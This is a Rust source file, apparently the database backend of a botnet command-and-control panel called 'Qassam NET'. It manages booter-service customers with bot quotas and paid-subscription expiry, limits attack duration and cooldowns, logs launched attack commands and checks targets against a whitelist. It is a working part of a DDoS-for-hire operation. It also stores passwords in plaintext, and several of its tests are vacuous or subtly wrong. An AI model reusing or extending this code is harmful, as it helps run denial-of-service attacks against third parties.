use mysql::{Opts, Pool, OptsBuilder};
use mysql::prelude::*;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::str::FromStr;
use std::time::{SystemTime, UNIX_EPOCH};
use thiserror::Error;


// --- Типы ошибок ---
#[derive(Error, Debug)]
pub enum QassamDatabaseError {
    #[error("Database connection error: {0}")]
    Connection(String),
    #[error("Query execution error: {0}")]
    Query(String),
    #[error("IP address parse error: {0}")]
    IpParse(#[from] std::net::AddrParseError),
    #[error("Time calculation error: {0}")]
    Time(#[from] std::time::SystemTimeError),
    #[error("User not found")]
    UserNotFound,
    #[error("Access terminated")]
    AccessTerminated,
    #[error("Duration limit exceeded: {0}")]
    DurationLimit(String),
    #[error("Cooldown active: {0}")]
    Cooldown(String),
}

// Аналог AccountInfo
#[derive(Debug, Clone)]
pub struct QassamAccountInfo {
    pub username: String,
    pub max_bots: i32,
    pub admin: i32,
}

// Аналог Database
#[derive(Debug, Clone)]
pub struct QassamDataBase {
    pub db: Pool,
}

// Структура для атаки
#[derive(Debug)]
pub struct QassamAttack {
    pub targets: HashMap<u32, u8>, // key: IP в сетевом порядке (big endian), value: netmask
}

impl QassamDataBase {
    pub fn qassam_new(db_addr: &str, db_user: &str, db_password: &str, db_name: &str) -> Result<Self, QassamDatabaseError> {
        // Создаем Opts с помощью OptsBuilder
        let opts = OptsBuilder::new()
            .ip_or_hostname(Some(db_addr))
            .user(Some(db_user))
            .pass(Some(db_password))
            .db_name(Some(db_name));

        let pool = Pool::new(opts)
            .map_err(|e| QassamDatabaseError::Connection(e.to_string()))?;

        println!("\x1b[0;32mQassam NET started!\r\n");
        println!("\x1b[0;32mMade by Qassam Team\r\n");

        Ok(QassamDataBase { db: pool })
    }

    pub fn qassam_new_from_url(db_url: &str) -> Result<Self, QassamDatabaseError> {
        let opts = Opts::from_url(db_url).map_err(|e| QassamDatabaseError::Connection(e.to_string()))?;
        let pool = Pool::new(opts).map_err(|e| QassamDatabaseError::Connection(e.to_string()))?;
        println!("\x1b[0;32mQassam NET started!\r\n");
        println!("\x1b[0;32mMade by Qassam Team\r\n");
        Ok(QassamDataBase { db: pool })
    }

    pub fn qassam_try_login(&self, username: &str, password: &str) -> Result<(bool, QassamAccountInfo), QassamDatabaseError> {
        let mut conn = self.db.get_conn().map_err(|e| QassamDatabaseError::Connection(e.to_string()))?;
        let query = "SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))";
        let result: Option<(String, i32, i32)> = conn.exec_first(query, (username, password)).map_err(|e| QassamDatabaseError::Query(e.to_string()))?;

        match result {
            Some((username, max_bots, admin)) => {
                Ok((true, QassamAccountInfo {
                    username,
                    max_bots,
                    admin,
                }))
            }
            None => Ok((false, QassamAccountInfo {
                username: "".to_string(),
                max_bots: 0,
                admin: 0,
            })),
        }
    }

    pub fn qassam_create_user(&self, username: &str, password: &str, max_bots: i32, duration: i32, cooldown: i32) -> Result<bool, QassamDatabaseError> {
        let mut conn = self.db.get_conn().map_err(|e| QassamDatabaseError::Connection(e.to_string()))?;
        let check_query = "SELECT username FROM users WHERE username = ?";
        let existing: Option<String> = conn.exec_first(check_query, (username,)).map_err(|e| QassamDatabaseError::Query(e.to_string()))?;

        if existing.is_some() {
            return Ok(false);
        }
        let insert_query = "INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)";
        conn.exec_drop(insert_query, (username, password, max_bots, cooldown, duration)).map_err(|e| QassamDatabaseError::Query(e.to_string()))?;
        Ok(true)
    }

    fn netshift(prefix: u32, netmask: u8) -> u32 {
        if netmask >= 32 {
            prefix
        } else {
            prefix >> (32 - netmask)
        }
    }

    pub fn qassam_contains_whitelisted_targets(&self, attack: &QassamAttack) -> Result<bool, QassamDatabaseError> {
        let mut conn = self.db.get_conn().map_err(|e| QassamDatabaseError::Connection(e.to_string()))?;
        let query = "SELECT prefix, netmask FROM whitelist";
        let whitelist_entries: Vec<(String, u8)> = conn.exec_map(query, (), |(prefix, netmask)| (prefix, netmask)).map_err(|e| QassamDatabaseError::Query(e.to_string()))?;

        for (prefix, netmask) in whitelist_entries {
            let ip = Ipv4Addr::from_str(&prefix)?;
            let i_whitelist_prefix = u32::from(ip).to_be(); // Конвертируем в big endian

            for (&a_p_network_order, &a_n) in &attack.targets {
                if a_n > netmask {
                    // Whitelist is less specific than attack target
                    if Self::netshift(i_whitelist_prefix, netmask) == Self::netshift(a_p_network_order, netmask) {
                        return Ok(true);
                    }
                } else if a_n < netmask {
                    // Attack target is less specific than whitelist
                    if Self::netshift(i_whitelist_prefix, a_n) == Self::netshift(a_p_network_order, a_n) {
                        return Ok(true);
                    }
                } else {
                    // Both target and whitelist have same prefix
                    if i_whitelist_prefix == a_p_network_order {
                        return Ok(true);
                    }
                }
            }
        }
        Ok(false)
    }

    pub fn qassam_can_launch_attack(&self,username: &str,duration: u32,full_command: &str,max_bots: i32,_allow_concurrent: i32) -> Result<bool, QassamDatabaseError> {
        let mut conn = self.db.get_conn().map_err(|e| QassamDatabaseError::Connection(e.to_string()))?;
        let user_query = "SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?";
        let user_info: Option<(u32, u32, u32, u32)> = conn.exec_first(user_query, (username,)).map_err(|e| QassamDatabaseError::Query(e.to_string()))?;

        let (user_id, duration_limit, admin, cooldown) = match user_info {
            Some(info) => info,
            None => return Err(QassamDatabaseError::AccessTerminated),
        };

        if duration_limit != 0 && duration > duration_limit {
            return Err(QassamDatabaseError::DurationLimit(
                format!("You may not send attacks longer than {} seconds.", duration_limit)
            ));
        }

        if admin == 0 {
            let cooldown_query = "SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()";
            let cooldown_info: Option<(u32, u32)> = conn.exec_first(cooldown_query, (user_id, cooldown)).map_err(|e| QassamDatabaseError::Query(e.to_string()))?;

            if let Some((time_sent, history_duration)) = cooldown_info {
                let current_time = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs() as u32;
                let wait_time = (time_sent + history_duration + cooldown).saturating_sub(current_time);

                if wait_time > 0 {
                    return Err(QassamDatabaseError::Cooldown(format!("Please wait {} seconds before sending another attack", wait_time)));
                }
            }
        }
        let insert_query = "INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)";
        conn.exec_drop(insert_query, (user_id, duration, full_command, max_bots)).map_err(|e| QassamDatabaseError::Query(e.to_string()))?;
        Ok(true)
    }

    pub fn qassam_check_api_code(&self, api_key: &str) -> Result<(bool, QassamAccountInfo), QassamDatabaseError> {
        let mut conn = self.db.get_conn().map_err(|e| QassamDatabaseError::Connection(e.to_string()))?;
        let query = "SELECT username, max_bots, admin FROM users WHERE api_key = ?";
        let result: Option<(String, i32, i32)> = conn.exec_first(query, (api_key,)).map_err(|e| QassamDatabaseError::Query(e.to_string()))?;

        match result {
            Some((username, max_bots, admin)) => {
                Ok((true, QassamAccountInfo {
                    username,
                    max_bots,
                    admin,
                }))
            }
            None => Ok((false, QassamAccountInfo {
                username: "".to_string(),
                max_bots: 0,
                admin: 0,
            })),
        }
    }

    pub fn qassam_get_user_info(&self, username: &str) -> Result<Option<QassamAccountInfo>, QassamDatabaseError> {
        let mut conn = self.db.get_conn().map_err(|e| QassamDatabaseError::Connection(e.to_string()))?;
        let query = "SELECT username, max_bots, admin FROM users WHERE username = ?";
        let result: Option<(String, i32, i32)> = conn.exec_first(query, (username,)).map_err(|e| QassamDatabaseError::Query(e.to_string()))?;
        Ok(result.map(|(username, max_bots, admin)| QassamAccountInfo {
            username,
            max_bots,
            admin,
        }))
    }

    pub fn qassam_update_user_last_paid(&self, username: &str) -> Result<(), QassamDatabaseError> {
        let mut conn = self.db.get_conn().map_err(|e| QassamDatabaseError::Connection(e.to_string()))?;
        let query = "UPDATE users SET last_paid = UNIX_TIMESTAMP() WHERE username = ?";
        conn.exec_drop(query, (username,)).map_err(|e| QassamDatabaseError::Query(e.to_string()))?;
        Ok(())
    }

    pub fn qassam_check_connection(&self) -> Result<bool, QassamDatabaseError> {
        let mut conn = self.db.get_conn().map_err(|e| QassamDatabaseError::Connection(e.to_string()))?;
        let result: Option<u32> = conn.exec_first("SELECT 1", ()).map_err(|e| QassamDatabaseError::Query(e.to_string()))?;
        Ok(result == Some(1))
    }
}

#[cfg(test)]
impl QassamDataBase {
    pub fn new_mock() -> Self {
        let opts = OptsBuilder::new().ip_or_hostname(Some("localhost")).user(Some("test")).pass(Some("test")).db_name(Some("test"));
        let pool = Pool::new(opts).expect("Failed to create mock pool");
        QassamDataBase { db: pool }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    struct MockDb;

    impl MockDb {
        fn setup_test_data() -> QassamAttack {
            let mut targets = HashMap::new();
            targets.insert(0x0A000000, 8);  // 10.0.0.0/8
            targets.insert(0xC0A80000, 16); // 192.168.0.0/16
            QassamAttack { targets }
        }
    }

    #[test]
    fn test_netshift() {
        assert_eq!(QassamDataBase::netshift(0x0A000000, 8), 0x0A);
        assert_eq!(QassamDataBase::netshift(0x0A010000, 16), 0x0A01);
        assert_eq!(QassamDataBase::netshift(0xC0A80000, 24), 0xC0A800);
        assert_eq!(QassamDataBase::netshift(0xFFFFFFFF, 32), 0xFFFFFFFF);
        assert_eq!(QassamDataBase::netshift(0x12345678, 0), 0);
    }

    #[test]
    fn test_ip_conversion() {
        let ip = Ipv4Addr::from_str("10.0.0.1").unwrap();
        let ip_u32 = u32::from(ip);
        assert_eq!(ip_u32, 0x0A000001);

        let ip_be = ip_u32.to_be();
        assert_eq!(ip_be, 0x0A000001);
    }

    #[test]
    fn test_whitelist_logic() {
        let attack = MockDb::setup_test_data();

        // Тестируем логику сравнения сетей
        let whitelist_prefix = 0x0A000000; // 10.0.0.0
        let attack_prefix = 0x0A010000;    // 10.1.0.0

        // При маске /8 они должны совпадать
        assert_eq!(
            QassamDataBase::netshift(whitelist_prefix, 8),
            QassamDataBase::netshift(attack_prefix, 8)
        );

        // При маске /16 они не должны совпадать
        assert_ne!(
            QassamDataBase::netshift(whitelist_prefix, 16),
            QassamDataBase::netshift(attack_prefix, 16)
        );
    }

    #[test]
    fn test_database_creation() {
        // Тест создания базы данных (без реального подключения)
        let result = QassamDataBase::qassam_new("localhost", "user", "pass", "dbname");

        // Это может упасть из-за отсутствия реальной БД, но мы проверяем что функция существует
        assert!(result.is_err() || result.is_ok());
    }

    #[test]
    fn test_account_info_struct() {
        let account = QassamAccountInfo {
            username: "testuser".to_string(),
            max_bots: 100,
            admin: 0,
        };

        assert_eq!(account.username, "testuser");
        assert_eq!(account.max_bots, 100);
        assert_eq!(account.admin, 0);
    }

    #[test]
    fn test_attack_struct() {
        let mut targets = HashMap::new();
        targets.insert(0x08080808, 32); // 8.8.8.8/32

        let attack = QassamAttack { targets };

        assert_eq!(attack.targets.len(), 1);
        assert_eq!(attack.targets.get(&0x08080808), Some(&32));
    }

    #[test]
    fn test_error_types() {
        // Проверяем что типы ошибок правильно создаются
        let conn_error = QassamDatabaseError::Connection("test".to_string());
        let query_error = QassamDatabaseError::Query("test".to_string());
        let duration_error = QassamDatabaseError::DurationLimit("test".to_string());
        let cooldown_error = QassamDatabaseError::Cooldown("test".to_string());
        let access_error = QassamDatabaseError::AccessTerminated;

        assert!(matches!(conn_error, QassamDatabaseError::Connection(_)));
        assert!(matches!(query_error, QassamDatabaseError::Query(_)));
        assert!(matches!(duration_error, QassamDatabaseError::DurationLimit(_)));
        assert!(matches!(cooldown_error, QassamDatabaseError::Cooldown(_)));
        assert!(matches!(access_error, QassamDatabaseError::AccessTerminated));
    }

    #[test]
    fn test_netshift_edge_cases() {
        // Граничные случаи для netshift
        assert_eq!(QassamDataBase::netshift(0x00000000, 0), 0);
        assert_eq!(QassamDataBase::netshift(0xFFFFFFFF, 32), 0xFFFFFFFF);
        assert_eq!(QassamDataBase::netshift(0x12345678, 1), 0x12345678 >> 31);
        assert_eq!(QassamDataBase::netshift(0x12345678, 31), 0x12345678 >> 1);
    }

    #[test]
    fn test_whitelist_comparison_cases() {
        // Различные сценарии сравнения whitelist
        let test_cases = vec![
            // (whitelist_ip, whitelist_mask, attack_ip, attack_mask, should_match)
            ("10.0.0.0", 8, "10.1.2.3", 32, true),   // Whitelist менее специфичен
            ("192.168.1.0", 24, "192.168.2.0", 16, false), // Атака менее специфична, но сети разные
            ("8.8.8.8", 32, "8.8.8.8", 32, true),    // Полное совпадение
            ("8.8.8.8", 32, "8.8.8.9", 32, false),   // Разные IP
        ];

        for (wl_ip, wl_mask, atk_ip, atk_mask, should_match) in test_cases {
            let wl_addr = Ipv4Addr::from_str(wl_ip).unwrap();
            let atk_addr = Ipv4Addr::from_str(atk_ip).unwrap();

            let wl_prefix = u32::from(wl_addr).to_be();
            let atk_prefix = u32::from(atk_addr).to_be();

            let matches = if atk_mask > wl_mask {
                // Whitelist is less specific than attack target
                QassamDataBase::netshift(wl_prefix, wl_mask) == QassamDataBase::netshift(atk_prefix, wl_mask)
            } else if atk_mask < wl_mask {
                // Attack target is less specific than whitelist
                QassamDataBase::netshift(wl_prefix, atk_mask) == QassamDataBase::netshift(atk_prefix, atk_mask)
            } else {
                // Same mask
                wl_prefix == atk_prefix
            };

            assert_eq!(matches, should_match, "Failed for case: {} - {}", wl_ip, atk_ip);
        }
    }

    #[test]
    fn test_clone_impl() {
        // Тестируем что структуры можно клонировать
        let account = QassamAccountInfo {
            username: "test".to_string(),
            max_bots: 50,
            admin: 1,
        };

        let cloned = account.clone();
        assert_eq!(account.username, cloned.username);
        assert_eq!(account.max_bots, cloned.max_bots);
        assert_eq!(account.admin, cloned.admin);
    }

    // Тест для проверки создания базы с URL
    #[test]
    fn test_url_creation() {
        let result = QassamDataBase::qassam_new_from_url("mysql://user:pass@localhost/dbname");
        assert!(result.is_err() || result.is_ok());
    }

    // Тест mock базы данных
    #[test]
    fn test_mock_database() {
        let mock_db = QassamDataBase::new_mock();
        // Просто проверяем что создается без ошибок
        assert!(std::mem::size_of_val(&mock_db) > 0);
    }
}
